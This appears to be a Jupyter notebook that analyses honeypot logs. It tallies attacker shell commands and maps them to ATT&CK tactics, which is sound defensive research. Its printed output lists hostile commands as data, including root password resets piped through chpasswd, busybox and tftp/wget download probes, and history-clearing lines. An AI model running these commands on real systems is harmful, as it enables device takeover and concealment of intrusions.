#  'echo "root:3QmUgfWWQ6Ra"|chpasswd|bash': 2,
#  'echo "root:uAW56volEsRz"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox WESWX': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox WESWX': 1,
#  'tftp; wget; /bin/busybox WESWX': 1,
#  '/bin/busybox WESWX': 1,
#  'echo "root:nwk6hi055x9C"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox QSYYQ': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox QSYYQ': 1,
#  'tftp; wget; /bin/busybox QSYYQ': 1,
#  '/bin/busybox QSYYQ': 1,
#  'cat /proc/mounts; /bin/busybox OWHIU': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox OWHIU': 1,
#  'tftp; wget; /bin/busybox OWHIU': 1,
#  '/bin/busybox OWHIU': 1,
#  'echo "root:8emRWpvqrNhJ"|chpasswd|bash': 1,
#  'echo "root:9cbMTQt0zQ1P"|chpasswd|bash': 1,
#  'echo "root:qkzOiXm2UqIu"|chpasswd|bash': 1,
#  'echo "root:RabyhPCaxlkK"|chpasswd|bash': 1,
#  'echo "root:ol2w8EHSv2Eb"|chpasswd|bash': 1,
#  'echo "root:hJ7d9DbGpid0"|chpasswd|bash': 2,
#  'echo "root:IYk5PM5pJlS7"|chpasswd|bash': 1,
#  'echo "root:izh6Jk2YuONo"|chpasswd|bash': 2,
#  'echo "root:C5iVxzkJ7ItI"|chpasswd|bash': 3,
#  'echo "root:xYhJElVbII7J"|chpasswd|bash': 1,
#  'echo "root:sDf1iEr093sv"|chpasswd|bash': 1,
#  'echo "root:h9m2vUSPjgSD"|chpasswd|bash': 2,
#  'cat /proc/mounts; /bin/busybox XSLCG': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox XSLCG': 1,
#  'tftp; wget; /bin/busybox XSLCG': 1,
#  '/bin/busybox XSLCG': 1,
#  'echo "root:oFkx6lf6qtHs"|chpasswd|bash': 2,
#  'cat /proc/mounts; /bin/busybox BHHLH': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox BHHLH': 1,
#  'tftp; wget; /bin/busybox BHHLH': 1,
#  '/bin/busybox BHHLH': 1,
#  'echo "root:y432pDXCSODo"|chpasswd|bash': 1,
#  'echo "root:EdwWAKUxP5qU"|chpasswd|bash': 1,
#  'echo "root:2T2GZoQ6FhPi"|chpasswd|bash': 2,
#  'cat /proc/mounts; /bin/busybox BZTPD': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox BZTPD': 1,
#  'tftp; wget; /bin/busybox BZTPD': 1,
#  '/bin/busybox BZTPD': 1,
#  'echo "root:Z9bR5YrZjiQa"|chpasswd|bash': 1,
#  'echo "root:jGGCqH3lQEPi"|chpasswd|bash': 1,
#  'echo "root:2RvLovSlOiBW"|chpasswd|bash': 1,
#  'echo "root:aLVZfP1y3G4V"|chpasswd|bash': 1,
#  'echo "root:HVWWfMayhXuB"|chpasswd|bash': 1,
#  'echo "root:6JFzLL21NnGQ"|chpasswd|bash': 1,
#  'echo "root:RHMB2DNNg1FS"|chpasswd|bash': 1,
#  'echo "root:3l7ycmaO0Hjv"|chpasswd|bash': 1,
#  'echo "root:jX2u2tRSrhuy"|chpasswd|bash': 1,
#  'echo "root:c9CXikTAvvwj"|chpasswd|bash': 2,
#  'echo "root:vhHEebhWnpxq"|chpasswd|bash': 1,
#  'echo "root:UmbkJM7XRj6E"|chpasswd|bash': 2,
#  'echo "root:oKzTQSTuFccH"|chpasswd|bash': 1,
#  'echo "root:SeiNpBPAFDpH"|chpasswd|bash': 1,
#  'echo "root:8cCtHm7Fd6hw"|chpasswd|bash': 1,
#  'echo "root:6vjuR1z4TJcf"|chpasswd|bash': 1,
#  'echo "root:QaYiOgmnEOBP"|chpasswd|bash': 1,
#  'echo "root:SJ2ZOoMmqUaL"|chpasswd|bash': 1,
#  'echo "root:GfB8RPPs3VEY"|chpasswd|bash': 1,
#  'echo "root:AYtU3MQXZXva"|chpasswd|bash': 1,
#  'echo "root:22kSyfF2NcsU"|chpasswd|bash': 2,
#  'echo "root:LNIsLrfAlPgD"|chpasswd|bash': 1,
#  'echo "root:nSMKmlsqTsAh"|chpasswd|bash': 1,
#  'echo "root:Rn7DQuOU5En0"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox YYBIR': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox YYBIR': 1,
#  'tftp; wget; /bin/busybox YYBIR': 1,
#  '/bin/busybox YYBIR': 1,
#  'echo "root:btXt2xLwsZWv"|chpasswd|bash': 1,
#  'echo "root:Q2uDTmoOs35I"|chpasswd|bash': 1,
#  'echo "root:xhhUZeDpab3w"|chpasswd|bash': 3,
#  'echo "root:MSVjJJe6DgJP"|chpasswd|bash': 1,
#  'echo "root:Z2ss2QpUXGps"|chpasswd|bash': 1,
#  'echo "root:lcrMarsKU4af"|chpasswd|bash': 1,
#  'echo "root:jwRXjNw3kcJg"|chpasswd|bash': 3,
#  'echo "root:ijICbjocgkXn"|chpasswd|bash': 1,
#  'echo "root:5iyOre0MpCnp"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox EAPYF': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox EAPYF': 1,
#  'tftp; wget; /bin/busybox EAPYF': 1,
#  '/bin/busybox EAPYF': 1,
#  'cat /proc/mounts; /bin/busybox POUFJ': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox POUFJ': 1,
#  'tftp; wget; /bin/busybox POUFJ': 1,
#  '/bin/busybox POUFJ': 1,
#  'echo "root:DWL2yi41Ya7u"|chpasswd|bash': 1,
#  'echo "root:QkPLPd4sXTh9"|chpasswd|bash': 1,
#  'echo "root:dlbzVgQ1u0x3"|chpasswd|bash': 1,
#  'echo "root:13Uv7qZpMM1S"|chpasswd|bash': 2,
#  'echo "root:8by72TUu9kJ9"|chpasswd|bash': 1,
#  'echo "root:qXR3elonBTwL"|chpasswd|bash': 1,
#  'echo "root:COFmuF65C0r5"|chpasswd|bash': 2,
#  'echo "root:IGDQoilt2TPs"|chpasswd|bash': 1,
#  'echo "root:mJG0aKluARYn"|chpasswd|bash': 1,
#  'echo "root:kyYK7rWfja5e"|chpasswd|bash': 1,
#  'echo "root:rPVjxagJpppl"|chpasswd|bash': 1,
#  'echo "root:rPkvn6zAjRpl"|chpasswd|bash': 1,
#  'echo "root:WR8HnxNrhJym"|chpasswd|bash': 1,
#  'echo "root:YBlUKVirdIBQ"|chpasswd|bash': 1,
#  'echo "root:6cWZqxEnwVWL"|chpasswd|bash': 1,
#  'echo "root:0AogQ5DcN9rT"|chpasswd|bash': 1,
#  'echo "root:AxxJvPnIfLTJ"|chpasswd|bash': 1,
#  'echo "root:EjbndF5UsocK"|chpasswd|bash': 2,
#  'echo "root:3FsM50bgvYSP"|chpasswd|bash': 1,
#  'echo "root:tDLv88iSQaB8"|chpasswd|bash': 1,
#  'echo "root:4IMdpWzGQTxQ"|chpasswd|bash': 1,
#  'echo "root:d4bOUMpbGKo5"|chpasswd|bash': 1,
#  'echo "root:btnCqLNpbEBJ"|chpasswd|bash': 2,
#  "echo -e '\\x67\\x61\\x79\\x66\\x67\\x74'": 217,
#  'echo "root:7I65bT4QMMvC"|chpasswd|bash': 1,
#  'echo "root:BBGD8YXX5L9U"|chpasswd|bash': 2,
#  'echo "root:y2iIe3lkPj48"|chpasswd|bash': 1,
#  'echo "root:7BNylB9PhiBj"|chpasswd|bash': 1,
#  'echo "root:uVAjMH3pN4Nf"|chpasswd|bash': 2,
#  'echo "root:TvS3DuWKk5ZO"|chpasswd|bash': 1,
#  'echo "root:dBGQnnLUP0Ak"|chpasswd|bash': 2,
#  'echo "root:5fBRPL8FYgNZ"|chpasswd|bash': 2,
#  'echo "root:Jv0k2fFBbC7U"|chpasswd|bash': 1,
#  'echo "root:yrxMm7lIWpoP"|chpasswd|bash': 1,
#  'echo "root:LClXpIM18CS5"|chpasswd|bash': 1,
#  'echo "root:Dk6aQnmm6IXv"|chpasswd|bash': 1,
#  'echo "root:lubKnv3KOoPt"|chpasswd|bash': 1,
#  'echo "root:t0pVKCxNUqdV"|chpasswd|bash': 1,
#  'echo "root:DXGqDKwoVY40"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox DIXGW': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox DIXGW': 1,
#  'tftp; wget; /bin/busybox DIXGW': 1,
#  '/bin/busybox DIXGW': 1,
#  'echo "root:y0utrXx5TtJj"|chpasswd|bash': 2,
#  'echo "root:izQnGwB6uidm"|chpasswd|bash': 1,
#  'echo "root:XmLGhDV3lbKC"|chpasswd|bash': 1,
#  'echo "root:Brm3jNQN5oWo"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox SHKYU': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox SHKYU': 1,
#  'tftp; wget; /bin/busybox SHKYU': 1,
#  '/bin/busybox SHKYU': 1,
#  'cat /proc/mounts; /bin/busybox MXWHF': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox MXWHF': 1,
#  'tftp; wget; /bin/busybox MXWHF': 1,
#  '/bin/busybox MXWHF': 1,
#  'cat /proc/mounts; /bin/busybox VPEBC': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox VPEBC': 1,
#  'tftp; wget; /bin/busybox VPEBC': 1,
#  '/bin/busybox VPEBC': 1,
#  'echo "root:BiK0rfYUGfUP"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox PBPJR': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox PBPJR': 1,
#  'tftp; wget; /bin/busybox PBPJR': 1,
#  '/bin/busybox PBPJR': 1,
#  'echo "root:trtDZPWJsup1"|chpasswd|bash': 1,
#  'echo "root:FOBZIU5CIp3r"|chpasswd|bash': 1,
#  'echo "root:XwsoiqJbs1mv"|chpasswd|bash': 2,
#  'echo "root:S4m6OvzuJnDu"|chpasswd|bash': 1,
#  'echo "root:JkfjiKBnVi6o"|chpasswd|bash': 1,
#  'echo "root:7ft59c4SEeWO"|chpasswd|bash': 2,
#  'cat /proc/mounts; /bin/busybox AHXQB': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox AHXQB': 1,
#  'tftp; wget; /bin/busybox AHXQB': 1,
#  '/bin/busybox AHXQB': 1,
#  'echo "root:QDg1iC05ltBV"|chpasswd|bash': 2,
#  'echo "root:Xocs0RBRFYxa"|chpasswd|bash': 2,
#  'unset HISTFILE ; unset HISTSIZE': 6,
#  'echo "root:EOMgL3tGqBha"|chpasswd|bash': 1,
#  'echo "root:IkaGyRiUQckw"|chpasswd|bash': 1,
#  'echo "root:7iD6bwadKDnV"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox BGIWL': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox BGIWL': 1,
#  'tftp; wget; /bin/busybox BGIWL': 1,
#  '/bin/busybox BGIWL': 1,
#  'echo "root:KWYNcmPnI7Xe"|chpasswd|bash': 1,
#  'echo "root:n2TYwq2MtA24"|chpasswd|bash': 1,
#  'echo "root:0yaa3XJyEsaM"|chpasswd|bash': 1,
#  'echo "root:3OHNgfvKbkxl"|chpasswd|bash': 2,
#  'echo "root:PolSnQmxzecq"|chpasswd|bash': 1,
#  'echo "root:IDV93jiGKSYQ"|chpasswd|bash': 1,
#  'echo "root:gZc3GEPfCTTq"|chpasswd|bash': 2,
#  'echo "root:UPeZYucW8L6q"|chpasswd|bash': 2,
#  'echo "root:TeEIPotgeciT"|chpasswd|bash': 2,
#  'echo "root:gfCP27dptH7D"|chpasswd|bash': 2,
#  'echo "root:Rp9jhWtIgRvD"|chpasswd|bash': 1,
#  'echo "root:V92XbZ2I6HKn"|chpasswd|bash': 1,
#  'echo "root:Mwfd5r8rWOfJ"|chpasswd|bash': 1,
#  'echo "root:pnDp6tcXG7cA"|chpasswd|bash': 1,
#  'echo "root:g9vvD6b1eN2p"|chpasswd|bash': 1,
#  'echo "root:zJewcdJfYMtC"|chpasswd|bash': 3,
#  'cat /proc/mounts; /bin/busybox AHQIQ': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox AHQIQ': 1,
#  'tftp; wget; /bin/busybox AHQIQ': 1,
#  '/bin/busybox AHQIQ': 1,
#  'echo "root:vhYF7mukmbY1"|chpasswd|bash': 1,
#  'echo "root:sHExbS3gXVyE"|chpasswd|bash': 2,
#  'echo "root:ETq0veZWBxFn"|chpasswd|bash': 2,
#  'echo "root:PaenKBm6iJ1M"|chpasswd|bash': 1,
#  'echo "root:83wWSp5cA8ej"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox MQEGT': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox MQEGT': 1,
#  'tftp; wget; /bin/busybox MQEGT': 1,
#  '/bin/busybox MQEGT': 1,
#  'echo "root:VVSUH32h8FWs"|chpasswd|bash': 1,
#  'echo "root:cDmx0ub7HaAr"|chpasswd|bash': 1,
#  'echo "root:cUQPLlWg6q4c"|chpasswd|bash': 2,
#  'echo "root:GGn8ZJTCwtmM"|chpasswd|bash': 1,
#  'echo "root:1sODxiKjpnVp"|chpasswd|bash': 2,
#  'cat /proc/mounts; /bin/busybox FDRDY': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox FDRDY': 1,
#  'tftp; wget; /bin/busybox FDRDY': 1,
#  '/bin/busybox FDRDY': 1,
#  'echo "root:D7fjCwXAmEUE"|chpasswd|bash': 3,
#  'echo "root:74S8RcA62rnz"|chpasswd|bash': 1,
#  'echo "root:uDpDA0UscWWl"|chpasswd|bash': 2,
#  'echo "root:YUWlG0MGGoig"|chpasswd|bash': 1,
#  'echo "root:xskakvKZWWEv"|chpasswd|bash': 1,
#  'echo "root:1FM8tisqR9ZB"|chpasswd|bash': 1,
#  'echo "root:P1CEDd20lqVP"|chpasswd|bash': 1,
#  'echo "root:lvKE0Akqadc7"|chpasswd|bash': 2,
#  'echo "root:crvr7AzxTP0a"|chpasswd|bash': 1,
#  'echo "root:4K9qB2bA77MQ"|chpasswd|bash': 1,
#  'echo "root:IrvKrAYyBB2R"|chpasswd|bash': 1,
#  'echo "root:AnW7xrMWvgSi"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox NLLXB': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox NLLXB': 1,
#  'tftp; wget; /bin/busybox NLLXB': 1,
#  '/bin/busybox NLLXB': 1,
#  'echo "root:3VOyyXZd06RN"|chpasswd|bash': 1,
#  'echo "root:ZrhFcUlb2skh"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox NYAFJ': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox NYAFJ': 1,
#  'tftp; wget; /bin/busybox NYAFJ': 1,
#  '/bin/busybox NYAFJ': 1,
#  'cat /proc/mounts; /bin/busybox PXUXU': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox PXUXU': 1,
#  'tftp; wget; /bin/busybox PXUXU': 1,
#  '/bin/busybox PXUXU': 1,
#  'cat /proc/mounts; /bin/busybox MMQQQ': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox MMQQQ': 1,
#  'tftp; wget; /bin/busybox MMQQQ': 1,
#  '/bin/busybox MMQQQ': 1,
#  'echo "root:q12BLgctlDsE"|chpasswd|bash': 1,
#  'echo "root:R6HhJXmCyVC8"|chpasswd|bash': 1,
#  'echo "root:I3kNBrsz8qnH"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox VZBRG': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox VZBRG': 1,
#  'tftp; wget; /bin/busybox VZBRG': 1,
#  '/bin/busybox VZBRG': 1,
#  'echo "root:H94mFqoQ0UeP"|chpasswd|bash': 1,
#  ...}

# %%
len(cmdic)
# Out:
# 63312

# %%
#sort descending by count
cmdicsort = {k: v for k, v in sorted(cmdic.items(), key=lambda item: item[1], reverse = True)}

# %%
#plot top 10 commands
import matplotlib.pyplot as plt

commands = list(cmdicsort.keys())[:14]
counts = list(cmdicsort.values())[:14]

fig = plt.figure(figsize = (10, 5))
plt.barh(commands, counts, color ='navy')
# Out:
# <BarContainer object of 14 artists>

# %%
kbase = pd.read_csv('knowledgebase.csv')
kbase
# Out:
#                 command                                    technique  \
# 0                  tftp                             Remote file copy
# 1                ftpget                             Remote file copy
# 2                  wget                             Remote file copy
# 3                  curl                             Remote file copy
# 4                   rcp                             Remote file copy
# 5                  copy                             Remote file copy
# 6                   tar                              Data compressed
# 7                   zip                              Data compressed
# 8                   rar                              Data compressed
# 9              shutdown                       System shutdown/reboot
# 10               reboot                       System shutdown/reboot
# 11             ultimate                    Network denial of service
# 12                  del                                File deletion
# 13                   rm                                File deletion
# 14                chmod  File and directory permissions modification
# 15              adduser                               Create account
# 16              usermod                         Account manipulation
# 17             groupadd                         Account manipulation
# 18                  dir                 File and directory discovery
# 19                   ls                 File and directory discovery
# 20                   cd                 File and directory discovery
# 21                   ps                            Process discovery
# 22  show archive config                         Credentials in files
# 23         show history                                Input capture
# 24         show logging                                Input capture
# 25                 echo                       Data from local system
# 26                  cat                       Data from local system
# 27                 more                       Data from local system
# 28                  pwd                       Data from local system
# 29               whoami                       Data from local system
# 30                   sh            Exploitation for client Execution
# 31                /mips            Exploitation for client Execution
# 32                /zuki            Exploitation for client Execution
# 33                 /nig            Exploitation for client Execution
#
#                tactic
# 0    Lateral movement
# 1    Lateral movement
# 2    Lateral movement
# 3    Lateral movement
# 4    Lateral movement
# 5    Lateral movement
# 6        Exfiltration
# 7        Exfiltration
# 8        Exfiltration
# 9              Impact
# 10             Impact
# 11             Impact
# 12    Defense evasion
# 13    Defense evasion
# 14    Defense evasion
# 15        Persistence
# 16        Persistence
# 17        Persistence
# 18          Discovery
# 19          Discovery
# 20          Discovery
# 21          Discovery
# 22  Credential access
# 23         Collection
# 24         Collection
# 25         Collection
# 26         Collection
# 27         Collection
# 28         Collection
# 29         Collection
# 30          Execution
# 31          Execution
# 32          Execution
# 33          Execution

# %%
#assign ttps to commands
cmdf = pd.DataFrame.from_dict({"commands": list(cmdicsort.keys()), "count": list(cmdicsort.values())})
#cmdf

cmdf['ttps'] = None
kls = kbase['command']

for i,row in tqdm(cmdf[:1000].iterrows()):
    ttps = [] #blank ttp list
    
    for k in kls:
        if k in row['commands']:
            ttp = list(kbase.loc[kbase['command'] == k,['technique','tactic']].values[0])
            if ttp not in ttps:
                ttps.append(ttp)
    cmdf.at[i,'ttps'] = ttps

cmdf[:1000]
# Out:
# 1000it [00:02, 438.84it/s]
#                                               commands   count  \
# 0                                   echo -e "\x6F\x6B"  144122
# 1                                             uname -a   65982
# 2    cat /proc/cpuinfo | grep name | head -n 1 | aw...   56152
# 3    free -m | grep Mem | awk '{print $2 ,$3, $4, $...   56122
# 4                                   ls -lh $(which ls)   56097
# ..                                                 ...     ...
# 995             echo "root:fHw1yP6tcofq"|chpasswd|bash       3
# 996             echo "root:YUUDpaOjFrXA"|chpasswd|bash       3
# 997             echo "root:6XDLWayYQKyK"|chpasswd|bash       3
# 998             echo "root:AKXSjdADkmC5"|chpasswd|bash       3
# 999             echo "root:KJ8iuoqa8rrM"|chpasswd|bash       3
#
#                                                   ttps
# 0               [[Data from local system, Collection]]
# 1                                                   []
# 2               [[Data from local system, Collection]]
# 3                                                   []
# 4          [[File and directory discovery, Discovery]]
# ..                                                 ...
# 995  [[Data from local system, Collection], [Exploi...
# 996  [[Data from local system, Collection], [Exploi...
# 997  [[Data from local system, Collection], [Exploi...
# 998  [[Data from local system, Collection], [Exploi...
# 999  [[Data from local system, Collection], [Exploi...
#
# [1000 rows x 3 columns]

# %%
cmdf.loc[999,'ttps']
# Out:
# [['Data from local system', 'Collection'],
#  ['Exploitation for client Execution', 'Execution']]

# %%
cmdf[:1000].to_csv("commandscount" + "_" + str(datetime.now().strftime('%Y_%m_%d_%H_%M_%S')) + ".csv", index=False)

# %%
#extracting ttps from df_os
df_os['ttps'] = None
kls = kbase['command']

for i,row in tqdm(df_os[:1000].iterrows()):
    ttps = [] #blank ttp list
    for cm in row['commands']:
        for k in kls:
            if k in cm:
                ttp = list(kbase.loc[kbase['command'] == k,['technique','tactic']].values[0])
                if ttp not in ttps:
                    ttps.append(ttp)
        df_os.at[i,'ttps'] = ttps

df_os[:1000]
